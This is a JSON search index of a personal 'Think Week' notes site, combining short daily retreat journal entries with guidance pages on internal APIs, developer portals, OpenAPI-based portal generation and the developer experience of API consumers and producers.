{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Introduction After learning of the concept of thinkweek, I've been eager to experience it myself. What is ThinkWeek The following figure from Reservations.com sums up the practical aspects of a Think Week.","title":"Overview"},{"location":"#introduction","text":"After learning of the concept of thinkweek, I've been eager to experience it myself.","title":"Introduction"},{"location":"#what-is-thinkweek","text":"The following figure from Reservations.com sums up the practical aspects of a Think Week.","title":"What is ThinkWeek"},{"location":"day1/","text":"Day 1 - 31.05 The first day has been productive and the absence of disturbances has had a significant impact on focus. Topic of toyday - Smart contract The topic of today has been Smart contracts . I've been able to dig deep down into the core in order to get a good understanding. Particularly, doing a code review of an example ERC721 contract has helped my understanding. There are still some remaining topics within this area I plan to cover on day 2. Office setup The office setup has worked very well. I brought a ultrawide monitor and setup in the living room of the cabin. I've also brought a small whiteboard (1mx1.5m) for structuring thoughts. Tools The toolchain setup for structuring and publishing my notes has worked very well and it has been important that this was prepared in advance. The tool chain consist of a github repo with notes in markdown. On every commit, a github action is triggered which runs mkdocs and publishes the content to https://elsewhat.com/thinkweek-dparnas-2021/ Time schedule The day started at 07:30 before breakfast and has typically had a 1 time focus slot followed by a break. Approximately once every two hours, I've gone outside for short walk to clearing my head.","title":"Day 1"},{"location":"day1/#day-1-3105","text":"The first day has been productive and the absence of disturbances has had a significant impact on focus.","title":"Day 1 - 31.05"},{"location":"day1/#topic-of-toyday-smart-contract","text":"The topic of today has been Smart contracts . I've been able to dig deep down into the core in order to get a good understanding. Particularly, doing a code review of an example ERC721 contract has helped my understanding. There are still some remaining topics within this area I plan to cover on day 2.","title":"Topic of toyday - Smart contract"},{"location":"day1/#office-setup","text":"The office setup has worked very well. I brought a ultrawide monitor and setup in the living room of the cabin. I've also brought a small whiteboard (1mx1.5m) for structuring thoughts.","title":"Office setup"},{"location":"day1/#tools","text":"The toolchain setup for structuring and publishing my notes has worked very well and it has been important that this was prepared in advance. The tool chain consist of a github repo with notes in markdown. On every commit, a github action is triggered which runs mkdocs and publishes the content to https://elsewhat.com/thinkweek-dparnas-2021/","title":"Tools"},{"location":"day1/#time-schedule","text":"The day started at 07:30 before breakfast and has typically had a 1 time focus slot followed by a break. Approximately once every two hours, I've gone outside for short walk to clearing my head.","title":"Time schedule"},{"location":"day2/","text":"Day 1 - 1.4 Topic of toyday - Shifting The topic of day 2 was a bit less structured than day 1. As the results for day 1 was active in my head, I decided to continue down that path for a second final day. The first half on was spent on: Summarizing day 1 Investigating level 2 blockchains and how they could interact with the main Ethereum blockchain. Brainstorming about smart contracts of everyday life in Norway In order to do the brainstorming about smart contracts of everyday life, I did a structuring of various of existing usage of smart contracts. I then decided this structuring of existing usage was a excellent deliverable from this day and made this available in the Smart contract usage section Time schedule Today, I've overextended and underestimate the work load required so it was a quite taxing day. For the next day two days I'll focusing on World class APIs and will use the first day for research and structuring the deliverables. Had a some walks in the alpine slope here and there are still some patches of snow","title":"Day 2"},{"location":"day2/#day-1-14","text":"","title":"Day 1 - 1.4"},{"location":"day2/#topic-of-toyday-shifting","text":"The topic of day 2 was a bit less structured than day 1. As the results for day 1 was active in my head, I decided to continue down that path for a second final day. The first half on was spent on: Summarizing day 1 Investigating level 2 blockchains and how they could interact with the main Ethereum blockchain. Brainstorming about smart contracts of everyday life in Norway In order to do the brainstorming about smart contracts of everyday life, I did a structuring of various of existing usage of smart contracts. I then decided this structuring of existing usage was a excellent deliverable from this day and made this available in the Smart contract usage section","title":"Topic of toyday - Shifting"},{"location":"day2/#time-schedule","text":"Today, I've overextended and underestimate the work load required so it was a quite taxing day. For the next day two days I'll focusing on World class APIs and will use the first day for research and structuring the deliverables. Had a some walks in the alpine slope here and there are still some patches of snow","title":"Time schedule"},{"location":"day3/","text":"Day 1 - 2.4 Topic of toyday - World class APIs Day 3 was dedicated as a research day for API related topics. The plan was not write any content. Watched Developer Empathy from Nordic APIs Adam DuVander presented there and had some interesting points, especially this figure caught my attention I therefore started reading his book \"Developer Marketing does not exist\" which I will finish on day 4. Some other interesting presentations watched: API-as-a-product Take Your API Docs from 406 Not Acceptable to 200 OK We Are Not Restful Anymore. . . And Its Fine What's Your Problem? Time schedule Gotten a nice rythm today on research. Had a nice long walk and stayed dry untill almost the end. facepalm The lack of human interaction is noticable though and find myself wanting outside stimuli. Had some phone calls with family. Oh and by the way, got a fly companion into the cabin. I call him Alfred.","title":"Day 3"},{"location":"day3/#day-1-24","text":"","title":"Day 1 - 2.4"},{"location":"day3/#topic-of-toyday-world-class-apis","text":"Day 3 was dedicated as a research day for API related topics. The plan was not write any content. Watched Developer Empathy from Nordic APIs Adam DuVander presented there and had some interesting points, especially this figure caught my attention I therefore started reading his book \"Developer Marketing does not exist\" which I will finish on day 4. Some other interesting presentations watched: API-as-a-product Take Your API Docs from 406 Not Acceptable to 200 OK We Are Not Restful Anymore. . . And Its Fine What's Your Problem?","title":"Topic of toyday - World class APIs"},{"location":"day3/#time-schedule","text":"Gotten a nice rythm today on research. Had a nice long walk and stayed dry untill almost the end. facepalm The lack of human interaction is noticable though and find myself wanting outside stimuli. Had some phone calls with family. Oh and by the way, got a fly companion into the cabin. I call him Alfred.","title":"Time schedule"},{"location":"day4/","text":"Day 4 - 3.4 Topic of toyday - Internal APIs and developer portals First half of the day was spent on research, watching more videos and reading up on other people's presentations. API the docs conference was interesting and I looked through all presentations from 2020 and 2021 . The presentation \"Internal Developer Portals: Developer Engagement Behind the Firewall\" by Kristof Van Tomme resonated with me and made me realize the needs for an internal API and its developer portal by both API consumers and API producers are different than those for the APIs of an internet native company. Therefore, I pivoted a bit on the deliverable to focus on the needs of API consumers and API producers related to internal APIs and their developer portal. Time schedule Today, I've spread the work more even across the full day from 8-21 with long breaks and \"free time\" in between. The experience has been good, but it has been important to stop the watching video presentations research as it wears down my energy. Albert says hi.","title":"Day 4"},{"location":"day4/#day-4-34","text":"","title":"Day 4 - 3.4"},{"location":"day4/#topic-of-toyday-internal-apis-and-developer-portals","text":"First half of the day was spent on research, watching more videos and reading up on other people's presentations. API the docs conference was interesting and I looked through all presentations from 2020 and 2021 . The presentation \"Internal Developer Portals: Developer Engagement Behind the Firewall\" by Kristof Van Tomme resonated with me and made me realize the needs for an internal API and its developer portal by both API consumers and API producers are different than those for the APIs of an internet native company. Therefore, I pivoted a bit on the deliverable to focus on the needs of API consumers and API producers related to internal APIs and their developer portal.","title":"Topic of toyday - Internal APIs and developer portals"},{"location":"day4/#time-schedule","text":"Today, I've spread the work more even across the full day from 8-21 with long breaks and \"free time\" in between. The experience has been good, but it has been important to stop the watching video presentations research as it wears down my energy. Albert says hi.","title":"Time schedule"},{"location":"day5/","text":"Day 1 - 4.4 Topic of toyday - Internal APIs and developer portals Getting ideas down to paper and focusing on completing the topic has been the focus for today. Parts of this felt like writing down things I already, but for other parts it was a nice way of structuring my thoughts. Time schedule A bit shorter day as I'm not spending the night in the cabin. Have not seen Albert today :(","title":"Day 5"},{"location":"day5/#day-1-44","text":"","title":"Day 1 - 4.4"},{"location":"day5/#topic-of-toyday-internal-apis-and-developer-portals","text":"Getting ideas down to paper and focusing on completing the topic has been the focus for today. Parts of this felt like writing down things I already, but for other parts it was a nice way of structuring my thoughts.","title":"Topic of toyday - Internal APIs and developer portals"},{"location":"day5/#time-schedule","text":"A bit shorter day as I'm not spending the night in the cabin. Have not seen Albert today :(","title":"Time schedule"},{"location":"future-of-work-and-daos/","text":"Future of Work and the rise of DAOS Planned for day 4","title":"Future of Work and the rise of DAOS"},{"location":"future-of-work-and-daos/#future-of-work-and-the-rise-of-daos","text":"Planned for day 4","title":"Future of Work and the rise of DAOS"},{"location":"internal-apis/","text":"Internal APIs and developer portals There exist a lot of material on the importance of APIs and developer portals and how they are essential for the growth of companies like Twilio and Stripe . There is less information available on APIs and developer portals internally in large organisation (and sometimes made available to their closest business partners). The presentation \"Internal Developer Portals: Developer Engagement Behind the Firewall\" by Kristof Van Tomme gives a high level overview of common frustrations: Poor discoverability Domain language ambiguity Lack of API design standards and inconsistent developer experience Lack of documentation Fragmented and complex authentication As he also mentions, there is a lot of focus on the developer experience of API consumer but very little on API producers. In my personal opinion, if you have have a structured and easy process for API producers, you will see an significant increase in the information available to API consumers. In this area we will look at three main areas: Developer mindset Developer experience for API consumers Developer experience for API producers","title":"Overview"},{"location":"internal-apis/#internal-apis-and-developer-portals","text":"There exist a lot of material on the importance of APIs and developer portals and how they are essential for the growth of companies like Twilio and Stripe . There is less information available on APIs and developer portals internally in large organisation (and sometimes made available to their closest business partners). The presentation \"Internal Developer Portals: Developer Engagement Behind the Firewall\" by Kristof Van Tomme gives a high level overview of common frustrations: Poor discoverability Domain language ambiguity Lack of API design standards and inconsistent developer experience Lack of documentation Fragmented and complex authentication As he also mentions, there is a lot of focus on the developer experience of API consumer but very little on API producers. In my personal opinion, if you have have a structured and easy process for API producers, you will see an significant increase in the information available to API consumers. In this area we will look at three main areas: Developer mindset Developer experience for API consumers Developer experience for API producers","title":"Internal APIs and developer portals"},{"location":"internal-apis/api-portal/","text":"API portal ideas Start page with all internal APIs and filtering on the left hand side Detail page of a single internal API Automated generation of the API portal based on OpenAPI contract Let's see how well we could automatically generate this based on the OpenAPI contract. OpenAPI specification 3.1.0 is available in Github and defines the fields available API card API name = info.title API elevator statement = info.summary last update needs to come from API portal update timestamp API details API name = info.title API elevator statement = info.summary API description = info.description <= Structured through markdown API version = info.version API contact details API contact = contact.name API contact email = contact.email Contact points = externalDocs.description + externalDocumentationObject.url (which can link to a slack channel) API resources overview API resources comes from tags. Redoc has an extension x-tagGroups and similar patternt is been investigated for OpenAPI specification . //If x-tagGroups exist perhaps only use the highest level? API resource name = tag.name API resource short description = tag.description tag.externalDocs also exist and could point to url with more information Releases Release notes must be maintained outside of OpenAPI specification. Planned / ongoing releases likely also needs to be maintenance in a different manner. Report issue Report issue is likely maintained outside of OpenAPI specification (though in theory specification extensions are allowed). Should lead the user into the service management portal of the company and in addition the contact points of the API","title":"API portal ideas"},{"location":"internal-apis/api-portal/#api-portal-ideas","text":"Start page with all internal APIs and filtering on the left hand side Detail page of a single internal API","title":"API portal ideas"},{"location":"internal-apis/api-portal/#automated-generation-of-the-api-portal-based-on-openapi-contract","text":"Let's see how well we could automatically generate this based on the OpenAPI contract. OpenAPI specification 3.1.0 is available in Github and defines the fields available","title":"Automated generation of the API portal based on OpenAPI contract"},{"location":"internal-apis/api-portal/#api-card","text":"API name = info.title API elevator statement = info.summary last update needs to come from API portal update timestamp","title":"API card"},{"location":"internal-apis/api-portal/#api-details","text":"API name = info.title API elevator statement = info.summary API description = info.description <= Structured through markdown API version = info.version","title":"API details"},{"location":"internal-apis/api-portal/#api-contact-details","text":"API contact = contact.name API contact email = contact.email Contact points = externalDocs.description + externalDocumentationObject.url (which can link to a slack channel)","title":"API contact details"},{"location":"internal-apis/api-portal/#api-resources-overview","text":"API resources comes from tags. Redoc has an extension x-tagGroups and similar patternt is been investigated for OpenAPI specification . //If x-tagGroups exist perhaps only use the highest level? API resource name = tag.name API resource short description = tag.description tag.externalDocs also exist and could point to url with more information","title":"API resources overview"},{"location":"internal-apis/api-portal/#releases","text":"Release notes must be maintained outside of OpenAPI specification. Planned / ongoing releases likely also needs to be maintenance in a different manner.","title":"Releases"},{"location":"internal-apis/api-portal/#report-issue","text":"Report issue is likely maintained outside of OpenAPI specification (though in theory specification extensions are allowed). Should lead the user into the service management portal of the company and in addition the contact points of the API","title":"Report issue"},{"location":"internal-apis/developer-mindset/","text":"Developer mindset It's important to know that you don't do marketing to developers. The focus must be on: Describing the business context for your API Provide the details to get started Provide the specification for the API contract Operational aspects such as uptime monitoring, error logs, usage logs and alert systems Facilitate a community including the developers consuming the API, the team responsible for DevOps and their product owners Feature request process Transparency on product backlog items for future releases Release notes for updates","title":"Developer mindset"},{"location":"internal-apis/developer-mindset/#developer-mindset","text":"It's important to know that you don't do marketing to developers. The focus must be on: Describing the business context for your API Provide the details to get started Provide the specification for the API contract Operational aspects such as uptime monitoring, error logs, usage logs and alert systems Facilitate a community including the developers consuming the API, the team responsible for DevOps and their product owners Feature request process Transparency on product backlog items for future releases Release notes for updates","title":"Developer mindset"},{"location":"internal-apis/dx-consumer-first-breaking-change/","text":"First breaking change The general trend for REST APIs and versioning is to use API evolution . Deprecation through releases API consumers should be made aware of deprecation: When deprecation is planned, the API producer team should analyse which API consumers are currently using the endpoints which will be affected by deprecation and inform contact persons Through API release notes Through their own monitoring of API requests returning a Sunset HTTP header API producers are encourage to not remove deprecated features before all API consumers have moved to the now recommended alternative.","title":"First breaking change"},{"location":"internal-apis/dx-consumer-first-breaking-change/#first-breaking-change","text":"The general trend for REST APIs and versioning is to use API evolution .","title":"First breaking change"},{"location":"internal-apis/dx-consumer-first-breaking-change/#deprecation-through-releases","text":"API consumers should be made aware of deprecation: When deprecation is planned, the API producer team should analyse which API consumers are currently using the endpoints which will be affected by deprecation and inform contact persons Through API release notes Through their own monitoring of API requests returning a Sunset HTTP header API producers are encourage to not remove deprecated features before all API consumers have moved to the now recommended alternative.","title":"Deprecation through releases"},{"location":"internal-apis/dx-consumer-first-experience/","text":"First experience We define the first experience as the steps required in order to perform the first call of the internal API. Minimize setup required In general, we want to minimize the steps required for setting up. For an internal API the following steps might be required: Get a subscription/API key from the API Portal OAuth2 authentication setup - Create client app registration and add internal API dependency OAuth2 authentication approval from admin Apply for authorization roles in back-end system Apply for authorization roles in API Execute the first request in your prefered tool such as postman or curl If possible, simplify this setup. The full process, start to finish, should be described in the API portal (regardless of the fact that the API DevOps team is not responsible for authorization roles in the backend system or OAuth2 authentication setup approval. Note that this process for internal APIs will in many cases be identical for several APIs so the content describing it can be shared. Getting started Getting started guide is essential to streamline the process of onboarding new API consumers. Make sure you keep it focused and to the point, the getting started guide is not an owners manual. An analogy to this is if you buy a new car. The car salesperson will use a few minutes with you to explain the core features of the car. The salesperson does not however hand you the owner's manual and tell you to study it before you drive out from the dealership.","title":"First experience"},{"location":"internal-apis/dx-consumer-first-experience/#first-experience","text":"We define the first experience as the steps required in order to perform the first call of the internal API.","title":"First experience"},{"location":"internal-apis/dx-consumer-first-experience/#minimize-setup-required","text":"In general, we want to minimize the steps required for setting up. For an internal API the following steps might be required: Get a subscription/API key from the API Portal OAuth2 authentication setup - Create client app registration and add internal API dependency OAuth2 authentication approval from admin Apply for authorization roles in back-end system Apply for authorization roles in API Execute the first request in your prefered tool such as postman or curl If possible, simplify this setup. The full process, start to finish, should be described in the API portal (regardless of the fact that the API DevOps team is not responsible for authorization roles in the backend system or OAuth2 authentication setup approval. Note that this process for internal APIs will in many cases be identical for several APIs so the content describing it can be shared.","title":"Minimize setup required"},{"location":"internal-apis/dx-consumer-first-experience/#getting-started","text":"Getting started guide is essential to streamline the process of onboarding new API consumers. Make sure you keep it focused and to the point, the getting started guide is not an owners manual. An analogy to this is if you buy a new car. The car salesperson will use a few minutes with you to explain the core features of the car. The salesperson does not however hand you the owner's manual and tell you to study it before you drive out from the dealership.","title":"Getting started"},{"location":"internal-apis/dx-consumer-first-feature-request/","text":"First feature request For internal APIs, most of the backlog consist of feature request from ongoing initiatives/projects. Therefore, most developers will need to request new features to the internal API and will be dependent on them being delivered before they can achieve their business outcome. Release plan transparency API producer DevOps teams need to ensure transparency of your upcoming releases and the planned content. In addition, there should be transparency of all feature requests coming from API consumers. A developer friendly way of doing this, is to use Github issues and milestones for high level representation. This allows the developers to see ongoing work and avoid creating duplicate user stories. Mature API contract together The API contract for feature requests should be a combined effort between the API producer and the API consumer requesting it. Documentation for the endpoint under maturing should be provided in a branch outside of the main release branch. Only when the endpoint is in production, is it merged into the main documentation. Low bar for reaching out Provide a slack channel for your API, where developers can ask informal questions for example on feature requests. Have the slack channel become the home of a community of API consumers and the API producer DevOps team.","title":"First feature request"},{"location":"internal-apis/dx-consumer-first-feature-request/#first-feature-request","text":"For internal APIs, most of the backlog consist of feature request from ongoing initiatives/projects. Therefore, most developers will need to request new features to the internal API and will be dependent on them being delivered before they can achieve their business outcome.","title":"First feature request"},{"location":"internal-apis/dx-consumer-first-feature-request/#release-plan-transparency","text":"API producer DevOps teams need to ensure transparency of your upcoming releases and the planned content. In addition, there should be transparency of all feature requests coming from API consumers. A developer friendly way of doing this, is to use Github issues and milestones for high level representation. This allows the developers to see ongoing work and avoid creating duplicate user stories.","title":"Release plan transparency"},{"location":"internal-apis/dx-consumer-first-feature-request/#mature-api-contract-together","text":"The API contract for feature requests should be a combined effort between the API producer and the API consumer requesting it. Documentation for the endpoint under maturing should be provided in a branch outside of the main release branch. Only when the endpoint is in production, is it merged into the main documentation.","title":"Mature API contract together"},{"location":"internal-apis/dx-consumer-first-feature-request/#low-bar-for-reaching-out","text":"Provide a slack channel for your API, where developers can ask informal questions for example on feature requests. Have the slack channel become the home of a community of API consumers and the API producer DevOps team.","title":"Low bar for reaching out"},{"location":"internal-apis/dx-consumer-first-impressions/","text":"First impressions The first time a developer learns of a new internal API is often through a presentation, an internal slack message, referal from a colleague or at the request of a product owner. In general, developers are from the offset somewhat skeptical of consuming new internal APIs as it's a new dependency against another team with different priorities and from experience the maturity of internal API varies alot. Gather information The first step will be to gather information on the internal API. There are three major sources: API Portal (hopefully the company has one common one where OpenAPI contracts are published) Enterprise search - Search engines covering internal material in the company such as presentations or work documents etc. Also includes searches on microblogging platforms such as slack and yammer. All this information may be outdated Code search - Search for code repositories internally in the organisation (typically github) As you can see from the above sources there are several challenges: API Portal usually leads the developer directly into the OpenAPI contracts without any additional context. Most internal APIs will have a barebone OpenAPI contract not describing the business context, but just listing individual endpoints Enterprise search may lead you to outdated information or irrelevant information (for example it's not unusual that two APIs have almost the same name) Code search have you start at the lowest possible level and it will be hard to understand the big picture on what the API supports If the information is insufficient, the next step for the developer will be to identify if they know someone who works with the API or at least knows someone who does. If the company does not have a vibrant developer community or has organsiational silos, the developer may give up and report back to the product owner. In this case, the product owner needs to go through the line organisation and request the responsible team to setup a workshope with his team. Action: Strengthen the API portal The key to improving the situation, is to strenghten the API portal beyond the OpenAPI contract. It needs to provide business context information for APIs in a consistent manner and the expectations on the level of quality of the information in the OpenAPI contract must be raised. Grouping of APIs should be done over both business processes and source systems. Mercedes-benz developer experience can be an inspiration (even though it's not an internal API portal) \"Leveraging API Docs and Tools at Mercedes-Benz developers\" presentation is useful to better understand their concept. Technical details The most mature API projects with the highest potential of reuse should be involved and help get an improved API portal in place. The content itself needs to be easily maintained by API producers (with possibility for API consumers to contribute). To facilitate this, using markdown and github respoitory as content store is a good choice. The developer experience of the API portal will evolve over time, and I believe the company should control it themselves on top of an open-source stack. I would prefer a static site generator (such as Jekyll or Mkdocs) publishing to Github pages. This architecture would need a customized build tool which queries the API portal software through APIs for all published OpenAPI contracts. Github actions is a good fit for this responsibility. This step will ensure APIs under development with no custom content in markdown are also represented in the overall API portal.","title":"First impressions"},{"location":"internal-apis/dx-consumer-first-impressions/#first-impressions","text":"The first time a developer learns of a new internal API is often through a presentation, an internal slack message, referal from a colleague or at the request of a product owner. In general, developers are from the offset somewhat skeptical of consuming new internal APIs as it's a new dependency against another team with different priorities and from experience the maturity of internal API varies alot.","title":"First impressions"},{"location":"internal-apis/dx-consumer-first-impressions/#gather-information","text":"The first step will be to gather information on the internal API. There are three major sources: API Portal (hopefully the company has one common one where OpenAPI contracts are published) Enterprise search - Search engines covering internal material in the company such as presentations or work documents etc. Also includes searches on microblogging platforms such as slack and yammer. All this information may be outdated Code search - Search for code repositories internally in the organisation (typically github) As you can see from the above sources there are several challenges: API Portal usually leads the developer directly into the OpenAPI contracts without any additional context. Most internal APIs will have a barebone OpenAPI contract not describing the business context, but just listing individual endpoints Enterprise search may lead you to outdated information or irrelevant information (for example it's not unusual that two APIs have almost the same name) Code search have you start at the lowest possible level and it will be hard to understand the big picture on what the API supports If the information is insufficient, the next step for the developer will be to identify if they know someone who works with the API or at least knows someone who does. If the company does not have a vibrant developer community or has organsiational silos, the developer may give up and report back to the product owner. In this case, the product owner needs to go through the line organisation and request the responsible team to setup a workshope with his team.","title":"Gather information"},{"location":"internal-apis/dx-consumer-first-impressions/#action-strengthen-the-api-portal","text":"The key to improving the situation, is to strenghten the API portal beyond the OpenAPI contract. It needs to provide business context information for APIs in a consistent manner and the expectations on the level of quality of the information in the OpenAPI contract must be raised. Grouping of APIs should be done over both business processes and source systems. Mercedes-benz developer experience can be an inspiration (even though it's not an internal API portal) \"Leveraging API Docs and Tools at Mercedes-Benz developers\" presentation is useful to better understand their concept.","title":"Action: Strengthen the API portal"},{"location":"internal-apis/dx-consumer-first-impressions/#technical-details","text":"The most mature API projects with the highest potential of reuse should be involved and help get an improved API portal in place. The content itself needs to be easily maintained by API producers (with possibility for API consumers to contribute). To facilitate this, using markdown and github respoitory as content store is a good choice. The developer experience of the API portal will evolve over time, and I believe the company should control it themselves on top of an open-source stack. I would prefer a static site generator (such as Jekyll or Mkdocs) publishing to Github pages. This architecture would need a customized build tool which queries the API portal software through APIs for all published OpenAPI contracts. Github actions is a good fit for this responsibility. This step will ensure APIs under development with no custom content in markdown are also represented in the overall API portal.","title":"Technical details"},{"location":"internal-apis/dx-consumer-first-operational-issue/","text":"First operational issue Operational issue will happen before or later. One of the first actions of the API consumer is to identify the root cause. Operational monitoring API consumers should be able to access status pr API on uptime. This should automatically be updated based on health checks running continously. Low bar for reaching out Provide a slack channel for your API, where API producers can inform of downtime and the actions being taken to recover operational status. Post mortem After any significant downtime, the API producers should supply the API consumers on a post mortem report on the root cause for the downtime and mitigating actions taken in order to reduce the likelihood of similar issues in the future.","title":"First operational issue"},{"location":"internal-apis/dx-consumer-first-operational-issue/#first-operational-issue","text":"Operational issue will happen before or later. One of the first actions of the API consumer is to identify the root cause.","title":"First operational issue"},{"location":"internal-apis/dx-consumer-first-operational-issue/#operational-monitoring","text":"API consumers should be able to access status pr API on uptime. This should automatically be updated based on health checks running continously.","title":"Operational monitoring"},{"location":"internal-apis/dx-consumer-first-operational-issue/#low-bar-for-reaching-out","text":"Provide a slack channel for your API, where API producers can inform of downtime and the actions being taken to recover operational status.","title":"Low bar for reaching out"},{"location":"internal-apis/dx-consumer-first-operational-issue/#post-mortem","text":"After any significant downtime, the API producers should supply the API consumers on a post mortem report on the root cause for the downtime and mitigating actions taken in order to reduce the likelihood of similar issues in the future.","title":"Post mortem"},{"location":"internal-apis/dx-consumer-first-use-case/","text":"First use case Once the first success is achieved, the developer likely wants to chain several API requests in order to achieve a business outcome. In many cases, the developer is not a domain expert and has only gotten vague input from product owner on what the goal is. Provide business context The API portal description should provide business context. For example, describe the difference between a corrective-work-order and preventive-work-order resource. This may be challenging for the API producer DevOps team to create, so ensure the product owner dimension is involved. Low bar for reaching out Provide a slack channel for your API, where developers can ask informal questions for example how they best can achieve their wanted business outcomes. Do not force them to register a support ticket or similar as developers will postpone this untill they have exhausted all other options. Have the slack channel become the home of a community of API consumers and the API producer DevOps team. More often than not, you will see API consumers helping each other out. Provide tools for grouping API request Encourage the use of tools like postman, where developers can setup a collection of API request they need to achieve their wanted business outcome. The API producer DevOps team should be responsible for maintaining a reference postman collection of typically API request grouped in a natural manner (as a golden rule, one request pr example of an endpoint in the OpenAPI contract).","title":"First use case"},{"location":"internal-apis/dx-consumer-first-use-case/#first-use-case","text":"Once the first success is achieved, the developer likely wants to chain several API requests in order to achieve a business outcome. In many cases, the developer is not a domain expert and has only gotten vague input from product owner on what the goal is.","title":"First use case"},{"location":"internal-apis/dx-consumer-first-use-case/#provide-business-context","text":"The API portal description should provide business context. For example, describe the difference between a corrective-work-order and preventive-work-order resource. This may be challenging for the API producer DevOps team to create, so ensure the product owner dimension is involved.","title":"Provide business context"},{"location":"internal-apis/dx-consumer-first-use-case/#low-bar-for-reaching-out","text":"Provide a slack channel for your API, where developers can ask informal questions for example how they best can achieve their wanted business outcomes. Do not force them to register a support ticket or similar as developers will postpone this untill they have exhausted all other options. Have the slack channel become the home of a community of API consumers and the API producer DevOps team. More often than not, you will see API consumers helping each other out.","title":"Low bar for reaching out"},{"location":"internal-apis/dx-consumer-first-use-case/#provide-tools-for-grouping-api-request","text":"Encourage the use of tools like postman, where developers can setup a collection of API request they need to achieve their wanted business outcome. The API producer DevOps team should be responsible for maintaining a reference postman collection of typically API request grouped in a natural manner (as a golden rule, one request pr example of an endpoint in the OpenAPI contract).","title":"Provide tools for grouping API request"},{"location":"internal-apis/dx-consumer-overview/","text":"Developer experience for API Consumer In Adam DuVander book \"Developer Marketing does not exist\" this figure caught my attention. He writes the following to explain the figure: \"The first impression colors how a developer approaches your company. Next, once a developer has chosen to give you a shot comes that initial experience, the thing you might mistakenly call the developer experience. While getting started is important, it's only the start. You next need to help a developer become successful, which will give them a higher likelihood of becoming a customer. Finally, they'll still need a great ongoing developer experience. Their last visit-as in the most recent- becomes important.\" This has several similarities on what in the UX community is refered to as a Journey map and is a powerful tool to understanding the mindset of a person and their actions over time. For internal APIs, the initial figure needs some extentions: First feature request: The functonality of the internal API is very often driven by the demands of the API consumers. Typically, several intiatives/projects will sponsor new parts for it. Developers will be actively seeking information on if the API can fulfill their current needs and if not provide detailed feature requests for new functionality First operational issue: Sooner or later, the API consuming solution will face downtime for users. The root cause will need to be identified and internal APIs are one possible source. First release: Developers need to be aware of new releases of the API in order to evalate potential impact and new possibilities First breaking change: Sooner or later, the API will have a breaking change (or a new version introduce). This may require an update in the API consuming solution and must be planned","title":"Overview"},{"location":"internal-apis/dx-consumer-overview/#developer-experience-for-api-consumer","text":"In Adam DuVander book \"Developer Marketing does not exist\" this figure caught my attention. He writes the following to explain the figure: \"The first impression colors how a developer approaches your company. Next, once a developer has chosen to give you a shot comes that initial experience, the thing you might mistakenly call the developer experience. While getting started is important, it's only the start. You next need to help a developer become successful, which will give them a higher likelihood of becoming a customer. Finally, they'll still need a great ongoing developer experience. Their last visit-as in the most recent- becomes important.\" This has several similarities on what in the UX community is refered to as a Journey map and is a powerful tool to understanding the mindset of a person and their actions over time. For internal APIs, the initial figure needs some extentions: First feature request: The functonality of the internal API is very often driven by the demands of the API consumers. Typically, several intiatives/projects will sponsor new parts for it. Developers will be actively seeking information on if the API can fulfill their current needs and if not provide detailed feature requests for new functionality First operational issue: Sooner or later, the API consuming solution will face downtime for users. The root cause will need to be identified and internal APIs are one possible source. First release: Developers need to be aware of new releases of the API in order to evalate potential impact and new possibilities First breaking change: Sooner or later, the API will have a breaking change (or a new version introduce). This may require an update in the API consuming solution and must be planned","title":"Developer experience for API Consumer"},{"location":"internal-apis/dx-producer-drive-adoption/","text":"Drive adoption An API in itself doesn't deliver value before it's consumed so it makes sense to spend effort on marketing the internal API to potential internal consumers. The more API consumers an internal API has, the more more value will it deliver and will evolve quicker due to increased funding. Sharing The product owner together with representatives of the DevOps team should actively present the current status and plans for the internal API. This can be as a general presentation, but also directly to owners of systems where there may be a potential. By sharing information on the internal API and lessons learned, you at the same time increase the knowledge of the internal API to the audience and this might be just the thing which creates a new API consumer in the future. Onboarding process Make the onboarding process for potential API consumers as simple as possible. Point them directly to the relevant information and follow up the progress or any questions they may have. If a potential API consumer has a use case where the internal API already has 80% of the functionality, but is missing the last 20%, prioritize the maturing and implementation of the delta functionality high compared to other requests. Leads Be active and follow up leads. Be aware of ongoing initiatives and think of if the internal API can deliver value there. Reach out to them informally to discuss the possiblities. Find new ways of consuming the API If there is a low-code trend in your, company make sure you treat them as other API consumer and do what you can to make the onboarding process as simple as possible. If a lot of business users are using excel, investigate how you can make the API available there. If a lot of business users are using command lines scripts, investigate how you can make the API available there. Enterprise architecture If your company has an enterprise architecture portal, ensure the internal API is properly represented there and points to the API portal for more information.","title":"Drive adoption"},{"location":"internal-apis/dx-producer-drive-adoption/#drive-adoption","text":"An API in itself doesn't deliver value before it's consumed so it makes sense to spend effort on marketing the internal API to potential internal consumers. The more API consumers an internal API has, the more more value will it deliver and will evolve quicker due to increased funding.","title":"Drive adoption"},{"location":"internal-apis/dx-producer-drive-adoption/#sharing","text":"The product owner together with representatives of the DevOps team should actively present the current status and plans for the internal API. This can be as a general presentation, but also directly to owners of systems where there may be a potential. By sharing information on the internal API and lessons learned, you at the same time increase the knowledge of the internal API to the audience and this might be just the thing which creates a new API consumer in the future.","title":"Sharing"},{"location":"internal-apis/dx-producer-drive-adoption/#onboarding-process","text":"Make the onboarding process for potential API consumers as simple as possible. Point them directly to the relevant information and follow up the progress or any questions they may have. If a potential API consumer has a use case where the internal API already has 80% of the functionality, but is missing the last 20%, prioritize the maturing and implementation of the delta functionality high compared to other requests.","title":"Onboarding process"},{"location":"internal-apis/dx-producer-drive-adoption/#leads","text":"Be active and follow up leads. Be aware of ongoing initiatives and think of if the internal API can deliver value there. Reach out to them informally to discuss the possiblities.","title":"Leads"},{"location":"internal-apis/dx-producer-drive-adoption/#find-new-ways-of-consuming-the-api","text":"If there is a low-code trend in your, company make sure you treat them as other API consumer and do what you can to make the onboarding process as simple as possible. If a lot of business users are using excel, investigate how you can make the API available there. If a lot of business users are using command lines scripts, investigate how you can make the API available there.","title":"Find new ways of consuming the API"},{"location":"internal-apis/dx-producer-drive-adoption/#enterprise-architecture","text":"If your company has an enterprise architecture portal, ensure the internal API is properly represented there and points to the API portal for more information.","title":"Enterprise architecture"},{"location":"internal-apis/dx-producer-establish/","text":"Establish internal API Establishing a new API and performing a successful end-to-end call can be a daunting task the first time it's performed. Here are a few of the steps typically involved: Create OpenAPI contract Upload OpenAPI contract to API portal Define policies in API portal Create API implementation as docker container Host API docker container Network architecture for communicating with back-end database/system from API docker container host Authentication OAuth2 authentication setup - Create client app registration and add internal API dependency OAuth2 authentication approval from admin Get a subscription/API key from the API portal Scaffolding The establish phase is not executed very regularly executed by a single team and these kinds of process are typically not well documented 